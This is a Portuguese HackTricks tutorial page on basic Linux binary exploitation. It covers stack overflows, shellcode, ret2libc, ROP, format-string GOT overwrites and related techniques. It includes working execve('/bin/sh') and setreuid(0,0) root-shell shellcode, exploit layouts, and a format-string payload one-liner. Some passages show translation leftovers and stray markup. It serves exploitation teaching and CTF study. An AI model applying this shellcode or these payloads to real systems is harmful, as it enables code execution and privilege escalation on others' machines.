# Explora√ß√£o Linux (B√°sico) (SPA)

## Explora√ß√£o Linux (B√°sico) (SPA)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## **ASLR**

Aleatoriza√ß√£o de Endere√ßos

**Desativar aleatoriza√ß√£o (ASLR) GLOBAL (root)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
Reativar aleatoriza√ß√£o GLOBAL: echo 2 > /proc/sys/kernel/randomize\_va\_space

**Desativar para uma execu√ß√£o** (n√£o requer root):\
setarch \`arch\` -R ./exemplo argumentos\
setarch \`uname -m\` -R ./exemplo argumentos

**Desativar prote√ß√£o de execu√ß√£o na pilha**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack exemplo.c -o exemplo

**Arquivo Core**\
ulimit -c unlimited\
gdb /exec arquivo_core\
/etc/security/limits.conf -> \* soft core unlimited

**Texto**\
**Dados**\
**BSS**\
**Heap**

**Pilha**

**Se√ß√£o BSS**: Vari√°veis globais ou est√°ticas n√£o inicializadas
```
static int i;
```
**Se√ß√£o DATA**: Vari√°veis globais ou est√°ticas inicializadas
```
int i = 5;
```
**Se√ß√£o TEXT**: Instru√ß√µes de c√≥digo (opcodes)

**Se√ß√£o HEAP**: Buffers alocados dinamicamente (malloc(), calloc(), realloc())

**Se√ß√£o STACK**: A pilha (Argumentos passados, strings de ambiente (env), vari√°veis locais...)

## **1. ESTOUROS DE PILHA**

> estouro de buffer, sobrecarga de buffer, estouro de pilha, esmagamento de pilha

Segmentation fault ou viola√ß√£o de segmenta√ß√£o: Quando se tenta acessar um endere√ßo de mem√≥ria que n√£o foi atribu√≠do ao processo.

Para obter o endere√ßo de uma fun√ß√£o dentro de um programa, pode-se fazer:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Chamada para sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

View kernel interrupts: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; clear eax\
xor ebx, ebx ; ebx = 0 because there are no arguments to pass\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Execute syscall

**nasm -f elf assembly.asm** ‚Äî> Returns a .o file\
**ld assembly.o -o shellcodeout** ‚Äî> Generates an executable with the assembly code and we can extract the opcodes with **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> To verify that it is indeed our shellcode and extract the OpCodes

**Verify that the shellcode works**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Para verificar se as chamadas de sistema est√£o sendo feitas corretamente, o programa anterior deve ser compilado e as chamadas de sistema devem aparecer em **strace ./PROGRAMA\_COMPILADO**

Ao criar shellcodes, um truque pode ser usado. A primeira instru√ß√£o √© um salto para uma chamada. A chamada chama o c√≥digo original e tamb√©m coloca o EIP na pilha. Ap√≥s a instru√ß√£o de chamada, inserimos a string necess√°ria, para que com esse EIP possamos apontar para a string e continuar executando o c√≥digo.

EX **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ usando o Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Ca√ßador de Ovos:**

Consiste em um pequeno c√≥digo que percorre as p√°ginas de mem√≥ria associadas a um processo em busca da shellcode ali armazenada (procura por alguma assinatura na shellcode). √ötil nos casos em que h√° apenas um pequeno espa√ßo para injetar c√≥digo.

**Shellcodes Polim√≥rficos**

S√£o shells cifrados que possuem um pequeno c√≥digo que os descriptografa e salta para ele, usando o truque de Call-Pop, este seria um **exemplo de cifra de C√©sar**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
1. **Atacando o Frame Pointer (EBP)**

√ötil em uma situa√ß√£o em que podemos modificar o EBP, mas n√£o o EIP.

Sabe-se que ao sair de uma fun√ß√£o, o seguinte c√≥digo assembly √© executado:
```
movl               %ebp, %esp
popl                %ebp
ret
```
De esta forma, se pode modificar o EBP ao sair de uma fun√ß√£o (fvuln) que foi chamada por outra fun√ß√£o, quando a fun√ß√£o que chamou fvuln terminar, seu EIP pode ser modificado.

Em fvuln, pode-se introduzir um EBP falso que aponte para um local onde esteja o endere√ßo da shellcode + 4 (√© necess√°rio adicionar 4 por causa do pop). Assim, ao sair da fun√ß√£o, o valor de &(\&Shellcode)+4 ser√° colocado em ESP, com o pop, 4 ser√° subtra√≠do de ESP e ele apontar√° para o endere√ßo da shellcode quando o ret for executado.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + preenchimento + &(\&Shellcode)+4

**Exploit Off-by-One**\
Permite modificar apenas o byte menos significativo do EBP. Pode-se realizar um ataque como o anterior, mas a mem√≥ria que armazena o endere√ßo da shellcode deve compartilhar os 3 primeiros bytes com o EBP.

## **4. M√©todos return to Libc**

M√©todo √∫til quando o stack n√£o √© execut√°vel ou deixa um buffer muito pequeno para modificar.

O ASLR faz com que, em cada execu√ß√£o, as fun√ß√µes sejam carregadas em posi√ß√µes diferentes da mem√≥ria. Portanto, esse m√©todo pode n√£o ser eficaz nesse caso. Para servidores remotos, como o programa est√° sendo executado constantemente no mesmo endere√ßo, pode ser √∫til.

* **cdecl (C declaration)** Coloca os argumentos no stack e limpa a pilha ap√≥s sair da fun√ß√£o
* **stdcall (standard call)** Coloca os argumentos na pilha e √© a fun√ß√£o chamada que limpa a pilha
* **fastcall** Coloca os dois primeiros argumentos em registradores e o restante na pilha

√â colocado o endere√ßo da instru√ß√£o system da libc e √© passada como argumento a string ‚Äú/bin/sh‚Äù, normalmente de uma vari√°vel de ambiente. Al√©m disso, √© usada a dire√ß√£o da fun√ß√£o exit para que, uma vez que a shell n√£o seja mais necess√°ria, o programa saia sem problemas (e escreva logs).

**export SHELL=/bin/sh**

Para encontrar os endere√ßos necess√°rios, pode-se olhar dentro do **GDB:**\
**p system**\
**p exit**\
**rabin2 -i execut√°vel** ‚Äî> Fornece o endere√ßo de todas as fun√ß√µes usadas pelo programa ao ser carregado\
(Dentro de um start ou algum breakpoint): **x/500s $esp** ‚Äî> Procuramos aqui a string /bin/sh

Uma vez que tenhamos esses endere√ßos, o **exploit** ficaria assim:

‚ÄúA‚Äù \* DIST√ÇNCIA EBP + 4 (EBP: podem ser 4 "A"s, embora seja melhor se for o EBP real para evitar falhas de segmenta√ß√£o) + Endere√ßo de **system** (sobrescrever√° o EIP) + Endere√ßo de **exit** (ao sair de system(‚Äú/bin/sh‚Äù), esta fun√ß√£o ser√° chamada, pois os primeiros 4 bytes do stack s√£o tratados como o pr√≥ximo endere√ßo do EIP a ser executado) + Endere√ßo de ‚Äú**/bin/sh**‚Äù (ser√° o par√¢metro passado para system)

Dessa forma, o EIP ser√° sobrescrito com o endere√ßo de system, que receber√° a string ‚Äú/bin/sh‚Äù como par√¢metro e, ao sair disso, executar√° a fun√ß√£o exit().

√â poss√≠vel encontrar a situa√ß√£o em que algum byte de algum endere√ßo de alguma fun√ß√£o seja nulo ou um espa√ßo (\x20). Nesse caso, pode-se desmontar os endere√ßos anteriores a essa fun√ß√£o, pois provavelmente haver√° v√°rios NOPs que permitir√£o chamar um deles em vez da fun√ß√£o diretamente (por exemplo, com > x/8i system-4).

Este m√©todo funciona porque, ao chamar uma fun√ß√£o como system usando o opcode **ret** em vez de **call**, a fun√ß√£o entende que os primeiros 4 bytes ser√£o o endere√ßo **EIP** para retornar.

Uma t√©cnica interessante com este m√©todo √© chamar **strncpy()** para mover um payload do stack para o heap e, posteriormente, usar **gets()** para executar esse payload.

Outra t√©cnica interessante √© o uso de **mprotect()**, que permite atribuir as permiss√µes desejadas a qualquer parte da mem√≥ria. Funciona ou funcionava no BDS, MacOS e OpenBSD, mas n√£o no Linux (controla que n√£o seja poss√≠vel conceder permiss√µes de escrita e execu√ß√£o ao mesmo tempo). Com esse ataque, seria poss√≠vel reconfigurar a pilha como execut√°vel.

**Encadeamento de fun√ß√µes**

Com base na t√©cnica anterior, essa forma de exploit consiste em:\
Preenchimento + \&Fun√ß√£o1 + \&pop;ret; + \&arg\_fun1 + \&Fun√ß√£o2 + \&pop;ret; + \&arg\_fun2 + ‚Ä¶

Dessa forma, √© poss√≠vel encadear fun√ß√µes a serem chamadas. Al√©m disso, se desejar usar fun√ß√µes com v√°rios argumentos, pode-se colocar os argumentos necess√°rios (por exemplo, 4) e inserir os 4 argumentos e procurar um endere√ßo com opcodes: pop, pop, pop, pop, ret ‚Äî> **objdump -d execut√°vel**

**Encadeamento atrav√©s de falsifica√ß√£o de frames (encadeamento de EBPs)**

Consiste em aproveitar a capacidade de manipular o EBP para encadear a execu√ß√£o de v√°rias fun√ß√µes por meio do EBP e de "leave;ret"

PREENCHIMENTO

* Coloca-se no EBP um EBP falso que aponta para: 2¬∫ EBP\_falso + a fun√ß√£o a ser executada: (\&system() + \&leave;ret + &‚Äú/bin/sh‚Äù)
* No EIP, coloca-se como endere√ßo uma fun√ß√£o &(leave;ret)

Inicia-se a shellcode com o endere√ßo da pr√≥xima parte da shellcode, por exemplo: 2¬∫EBP\_falso + \&system() + &(leave;ret;) + &‚Äù/bin/sh‚Äù

o 2¬∫EBP seria: 3¬∫EBP\_falso + \&system() + &(leave;ret;) + &‚Äù/bin/ls‚Äù

Essa shellcode pode ser repetida indefinidamente nas partes da mem√≥ria √†s quais se tem acesso, de modo que uma shellcode facilmente divis√≠vel em pequenos peda√ßos de mem√≥ria seja obtida.

(A execu√ß√£o de fun√ß√µes √© encadeada misturando as vulnerabilidades de EBP e ret2lib vistas anteriormente)

## **5. M√©todos complementares**

**Ret2Ret**

√ötil quando n√£o √© poss√≠vel inserir um endere√ßo do stack no EIP (verifica-se que o EIP n√£o contenha 0xbf) ou quando n√£o √© poss√≠vel calcular a localiza√ß√£o da shellcode. No entanto, a fun√ß√£o vulner√°vel aceita um par√¢metro (a shellcode ir√° aqui).

Dessa forma, ao alterar o EIP por um endere√ßo de um **ret**, a pr√≥xima dire√ß√£o ser√° carregada (que √© o endere√ßo do primeiro argumento da fun√ß√£o). Ou seja, a shellcode ser√° carregada.

O exploit seria: SHELLCODE + Preenchimento (at√© o EIP) + **\&ret** (os pr√≥ximos bytes da pilha apontam para o in√≠cio da shellcode, pois o endere√ßo do argumento passado √© colocado na pilha)

Parece que fun√ß√µes como **strncpy**, uma vez completas, removem da pilha o endere√ßo onde a shellcode estava armazenada, impossibilitando essa t√©cnica. Ou seja, o endere√ßo passado para a fun√ß√£o como argumento (que armazena a shellcode) √© alterado por um 0x00, ent√£o, ao chamar o segundo **ret**, encontra um 0x00 e o programa falha.
```
**Ret2PopRet**
```
**T√©cnica de Murat**

Se n√£o tivermos controle sobre o primeiro argumento, mas sim sobre o segundo ou terceiro, podemos sobrescrever o EIP com um endere√ßo de pop-ret ou pop-pop-ret, conforme necess√°rio.

Em Linux, todos os programas s√£o mapeados come√ßando em 0xbfffffff.

Ao observar como a pilha de um novo processo √© constru√≠da no Linux, √© poss√≠vel desenvolver um exploit de modo que o programa seja iniciado em um ambiente onde a √∫nica vari√°vel seja a shellcode. O endere√ßo dela pode ser calculado como: addr = 0xbfffffff - 4 - strlen(NOME_do_execut√°vel_completo) - strlen(shellcode)

Dessa forma, √© facilmente obtido o endere√ßo onde a vari√°vel de ambiente com a shellcode est√° localizada.

Isso √© poss√≠vel devido √† fun√ß√£o execle, que permite criar um ambiente com apenas as vari√°veis de ambiente desejadas.

**Jump to ESP: Estilo Windows**

Como o ESP est√° sempre apontando para o in√≠cio da pilha, essa t√©cnica consiste em substituir o EIP pelo endere√ßo de uma chamada para **jmp esp** ou **call esp**. Dessa forma, a shellcode √© salva ap√≥s a sobrescrita do EIP, pois ap√≥s a execu√ß√£o do **ret**, o ESP estar√° apontando para o pr√≥ximo endere√ßo, onde a shellcode foi armazenada.

Caso o ASLR n√£o esteja ativado no Windows ou Linux, √© poss√≠vel chamar **jmp esp** ou **call esp** armazenados em algum objeto compartilhado. Se o ASLR estiver ativado, pode-se procurar dentro do pr√≥prio programa vulner√°vel.

Al√©m disso, o fato de poder colocar a shellcode ap√≥s a corrup√ß√£o do EIP, em vez de no meio da pilha, permite que as instru√ß√µes push ou pop executadas no meio da fun√ß√£o n√£o afetem a shellcode (o que poderia ocorrer se estivesse no meio da pilha da fun√ß√£o).

De forma semelhante, se soubermos que uma fun√ß√£o retorna o endere√ßo onde a shellcode est√° armazenada, podemos chamar **call eax** ou **jmp eax (ret2eax).**

**ROP (Programa√ß√£o Orientada a Retorno) ou peda√ßos de c√≥digo emprestados**

Os trechos de c√≥digo invocados s√£o conhecidos como gadgets.

Essa t√©cnica consiste em encadear diferentes chamadas de fun√ß√µes usando a t√©cnica **ret2libc** e o uso de **pop,ret**.

Em algumas arquiteturas de processadores, cada instru√ß√£o √© um conjunto de 32 bits (como o MIPS, por exemplo). No entanto, na Intel, as instru√ß√µes t√™m tamanho vari√°vel e v√°rias instru√ß√µes podem compartilhar um conjunto de bits, por exemplo:

**movl $0xe4ff, -0x(%ebp)** ‚Äî> Cont√©m os bytes 0xffe4, que tamb√©m podem ser traduzidos como: **jmp \*%esp**

Dessa forma, √© poss√≠vel executar algumas instru√ß√µes que nem mesmo est√£o no programa original.

**ROPgadget.py** ajuda a encontrar valores em bin√°rios.

Este programa tamb√©m √© √∫til para criar os **payloads**. Voc√™ pode fornecer a biblioteca da qual deseja extrair os ROPs e ele gerar√° um payload em Python, ao qual voc√™ fornece o endere√ßo da biblioteca desejada e o payload estar√° pronto para ser usado como shellcode. Al√©m disso, como ele usa chamadas de sistema, n√£o executa nada na pilha, apenas vai armazenando endere√ßos de ROPs que ser√£o executados por meio de **ret**. Para usar esse payload, √© necess√°rio chamar o payload por meio de uma instru√ß√£o **ret**.

**Estouro de inteiros**

Esse tipo de estouro ocorre quando uma vari√°vel n√£o est√° preparada para suportar um n√∫mero t√£o grande quanto o fornecido, possivelmente devido a uma confus√£o entre vari√°veis com e sem sinal, por exemplo:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
No exemplo anterior, vemos que o programa espera 2 par√¢metros. O primeiro √© o comprimento da pr√≥xima string e o segundo √© a string.

Se passarmos um n√∫mero negativo como primeiro par√¢metro, ser√° exibido que len < 256 e passaremos por esse filtro, e tamb√©m strlen(buffer) ser√° menor que l, pois l √© um unsigned int e ser√° muito grande.

Esse tipo de overflow n√£o busca escrever algo no processo do programa, mas sim contornar filtros mal projetados para explorar outras vulnerabilidades.

**Vari√°veis n√£o inicializadas**

N√£o se sabe o valor que uma vari√°vel n√£o inicializada pode assumir e pode ser interessante observ√°-la. Pode ser que ela assuma o valor que uma vari√°vel da fun√ß√£o anterior assumia e que essa vari√°vel seja controlada pelo atacante.

## **Strings de Formata√ß√£o**

Em C, **`printf`** √© uma fun√ß√£o que pode ser usada para **imprimir** uma string. O **primeiro par√¢metro** que essa fun√ß√£o espera √© o **texto bruto com os formatadores**. Os **par√¢metros seguintes** esperados s√£o os **valores** para **substituir** os **formatadores** do texto bruto.

A vulnerabilidade ocorre quando um **texto do atacante √© colocado como o primeiro argumento** para essa fun√ß√£o. O atacante poder√° criar uma **entrada especial abusando** das capacidades de **string de formato printf** para **escrever qualquer dado em qualquer endere√ßo**. Dessa forma, sendo capaz de **executar c√≥digo arbitr√°rio**.

Formatadores:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **escreve** o **n√∫mero de bytes escritos** no **endere√ßo indicado. Escrever** tantos **bytes** quanto o n√∫mero hexadecimal que precisamos **escrever √© como voc√™ pode escrever qualquer dado**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### GOT (Tabela de Deslocamentos Globais) / PLT (Tabela de Liga√ß√£o de Procedimentos)

Esta √© a tabela que cont√©m o **endere√ßo** das **fun√ß√µes externas** usadas pelo programa.

Obtenha o endere√ßo desta tabela com: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Observe como ap√≥s **carregar** o **execut√°vel** no GEF voc√™ pode **ver** as **fun√ß√µes** que est√£o na **GOT**: `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

Usando o GEF voc√™ pode **iniciar** uma **sess√£o de depura√ß√£o** e executar **`got`** para ver a tabela got:

![](<../../.gitbook/assets/image (621).png>)

Em um bin√°rio, a GOT tem os **endere√ßos das fun√ß√µes ou** da se√ß√£o **PLT** que ir√° carregar o endere√ßo da fun√ß√£o. O objetivo deste exploit √© **sobrescrever a entrada da GOT** de uma fun√ß√£o que ser√° executada posteriormente **com** o **endere√ßo** do PLT da fun√ß√£o **`system`**. Idealmente, voc√™ ir√° **sobrescrever** a **GOT** de uma **fun√ß√£o** que est√° **prestes a ser chamada com par√¢metros controlados por voc√™** (assim voc√™ poder√° controlar os par√¢metros enviados para a fun√ß√£o system).

Se **`system`** **n√£o for usada** pelo script, a fun√ß√£o system **n√£o** ter√° uma entrada na GOT. Neste cen√°rio, voc√™ precisar√° **vazar primeiro o endere√ßo** da fun√ß√£o `system`.

A **Tabela de Liga√ß√£o de Procedimentos** √© uma tabela **somente leitura** no arquivo ELF que armazena todos os **s√≠mbolos necess√°rios que precisam de resolu√ß√£o**. Quando uma dessas fun√ß√µes √© chamada, a **GOT** ir√° **redirecionar** o **fluxo** para a **PLT** para que possa **resolver** o **endere√ßo** da fun√ß√£o e escrev√™-lo na GOT.\
Ent√£o, na **pr√≥xima vez** que uma chamada for feita para esse endere√ßo, a **fun√ß√£o** √© **chamada diretamente** sem precisar resolv√™-la.

Voc√™ pode ver os endere√ßos da PLT com **`objdump -j .plt -d ./vuln_binary`**

### **Fluxo de Explora√ß√£o**

Como explicado anteriormente, o objetivo ser√° **sobrescrever** o **endere√ßo** de uma **fun√ß√£o** na **tabela GOT** que ser√° chamada posteriormente. Idealmente, poder√≠amos definir o **endere√ßo de um shellcode** localizado em uma se√ß√£o execut√°vel, mas √© altamente prov√°vel que voc√™ n√£o consiga escrever um shellcode em uma se√ß√£o execut√°vel.\
Ent√£o, uma op√ß√£o diferente √© **sobrescrever** uma **fun√ß√£o** que **recebe** seus **argumentos** do **usu√°rio** e **apont√°-la** para a **fun√ß√£o `system`**.

Para escrever o endere√ßo, geralmente s√£o feitos 2 passos: Voc√™ **escreve primeiro 2Bytes** do endere√ßo e depois os outros 2. Para fazer isso, √© usado **`$hn`**.

**HOB** √© chamado para os 2 bytes mais altos do endere√ßo\
**LOB** √© chamado para os 2 bytes mais baixos do endere√ßo

Assim, devido ao funcionamento da string de formato, voc√™ precisa **escrever primeiro o menor** de \[HOB, LOB] e depois o outro.

Se HOB < LOB\
`[endere√ßo+2][endere√ßo]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Se HOB > LOB\
`[endere√ßo+2][endere√ßo]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N¬∫Param\_dir\_HOB LOB\_shell-HOB\_shell N¬∫Param\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Modelo de Explora√ß√£o de String de Formato**

Voc√™ pode encontrar um **modelo** para explorar a GOT usando strings de formato aqui:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

Essencialmente, esta √© uma estrutura com **fun√ß√µes que ser√£o chamadas** antes do programa terminar. Isso √© interessante se voc√™ puder chamar seu **shellcode apenas pulando para um endere√ßo**, ou em casos em que voc√™ precisa voltar ao main novamente para **explorar a string de formato uma segunda vez**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Note que isso **n√£o** criar√° um **loop eterno** porque quando voc√™ voltar para o principal, o can√°rio perceber√°, o final da pilha pode estar corrompido e a fun√ß√£o n√£o ser√° chamada novamente. Portanto, com isso voc√™ poder√° **ter mais 1 execu√ß√£o** da vulnerabilidade.

### **Formatar Strings para Extrair Conte√∫do**

Uma string de formata√ß√£o tamb√©m pode ser abusada para **extrair conte√∫do** da mem√≥ria do programa.\
Por exemplo, na seguinte situa√ß√£o h√° uma **vari√°vel local na pilha apontando para uma flag**. Se voc√™ **encontrar** onde na **mem√≥ria** o **ponteiro** para a **flag** est√°, voc√™ pode fazer o **printf acessar** esse **endere√ßo** e **imprimir** a **flag**:

Ent√£o, a flag est√° em **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

E a partir do vazamento voc√™ pode ver que o **ponteiro para a flag** est√° no **8¬∫** par√¢metro:

![](<../../.gitbook/assets/image (623).png>)

Portanto, **acessando** o **8¬∫ par√¢metro** voc√™ pode obter a flag:

![](<../../.gitbook/assets/image (624).png>)

Note que seguindo o **exploit anterior** e percebendo que voc√™ pode **vazar conte√∫do**, voc√™ pode **definir ponteiros** para o **`printf`** na se√ß√£o onde o **execut√°vel** est√° **carregado** e **extrair** ele **inteiramente**!

### **DTOR**

{% hint style="danger" %}
Atualmente √© muito **incomum encontrar um bin√°rio com uma se√ß√£o dtor**.
{% endhint %}

Os destrutores s√£o fun√ß√µes que s√£o **executadas antes do programa terminar**.\
Se voc√™ conseguir **escrever** um **endere√ßo** para um **shellcode** em **`__DTOR_END__`**, isso ser√° **executado** antes do programa terminar.\
Obtenha o endere√ßo desta se√ß√£o com:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Normalmente voc√™ encontrar√° a se√ß√£o **DTOR** **entre** os valores `ffffffff` e `00000000`. Portanto, se voc√™ apenas ver esses valores, significa que **n√£o h√° nenhuma fun√ß√£o registrada**. Portanto, **sobrescreva** o **`00000000`** com o **endere√ßo** do **shellcode** para execut√°-lo.

### **Strings de Formato para Estouros de Buffer**

O **sprintf move** uma string formatada **para** uma **vari√°vel**. Portanto, voc√™ poderia abusar da **formata√ß√£o** de uma string para causar um **estouro de buffer na vari√°vel** para onde o conte√∫do √© copiado.\
Por exemplo, a carga √∫til `%.44xAAAA` ir√° **escrever 44B+"AAAA" na vari√°vel**, o que pode causar um estouro de buffer.

### **Estruturas \_\_atexit**

{% hint style="danger" %}
Atualmente √© muito **incomum explorar isso**.
{% endhint %}

**`atexit()`** √© uma fun√ß√£o para a qual **outras fun√ß√µes s√£o passadas como par√¢metros**. Essas **fun√ß√µes** ser√£o **executadas** ao executar um **`exit()`** ou o **retorno** do **main**.\
Se voc√™ puder **modificar** o **endere√ßo** de qualquer uma dessas **fun√ß√µes** para apontar para um shellcode, por exemplo, voc√™ **obter√° controle** do **processo**, mas atualmente isso √© mais complicado.\
Atualmente, os **endere√ßos das fun√ß√µes** a serem executadas est√£o **ocultos** por v√°rias estruturas e, finalmente, o endere√ßo para o qual apontam n√£o s√£o os endere√ßos das fun√ß√µes, mas s√£o **criptografados com XOR** e deslocamentos com uma **chave aleat√≥ria**. Portanto, atualmente esse vetor de ataque n√£o √© muito √∫til, pelo menos em x86 e x64\_86.\
A **fun√ß√£o de criptografia** √© **`PTR_MANGLE`**. **Outras arquiteturas** como m68k, mips32, mips64, aarch64, arm, hppa... **n√£o implementam a fun√ß√£o de criptografia** porque **retornam o mesmo** que receberam como entrada. Portanto, essas arquiteturas seriam atac√°veis por esse vetor.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Atualmente √© muito **incomum explorar isso**.
{% endhint %}

**`Setjmp()`** permite **salvar** o **contexto** (os registradores)\
**`longjmp()`** permite **restaurar** o **contexto**.\
Os **registradores salvos** s√£o: `EBX, ESI, EDI, ESP, EIP, EBP`\
O que acontece √© que EIP e ESP s√£o passados pela fun√ß√£o **`PTR_MANGLE`**, ent√£o as **arquiteturas vulner√°veis a esse ataque s√£o as mesmas acima**.\
Eles s√£o √∫teis para recupera√ß√£o de erros ou interrup√ß√µes.\
No entanto, pelo que li, os outros registradores n√£o s√£o protegidos, **ent√£o se houver um `call ebx`, `call esi` ou `call edi`** dentro da fun√ß√£o chamada, o controle pode ser assumido. Ou tamb√©m poderia modificar EBP para modificar o ESP.

**VTable e VPTR em C++**

Cada classe tem uma **Vtable** que √© um array de **ponteiros para m√©todos**.

Cada objeto de uma **classe** tem um **VPtr** que √© um **ponteiro** para o array de sua classe. O VPtr faz parte do cabe√ßalho de cada objeto, ent√£o se uma **sobrescrita** do **VPtr** for alcan√ßada, poderia ser **modificado** para **apontar** para um m√©todo fict√≠cio para que a execu√ß√£o de uma fun√ß√£o v√° para o shellcode.

## **Medidas preventivas e evas√µes**

**ASLR n√£o t√£o aleat√≥rio**

O PaX divide o espa√ßo de endere√ßamento do processo em 3 grupos:

C√≥digo e dados iniciados e n√£o iniciados: .text, .data e .bss ‚Äî> 16 bits de entropia na vari√°vel delta\_exec, esta vari√°vel √© iniciada aleatoriamente com cada processo e √© somada aos endere√ßos iniciais

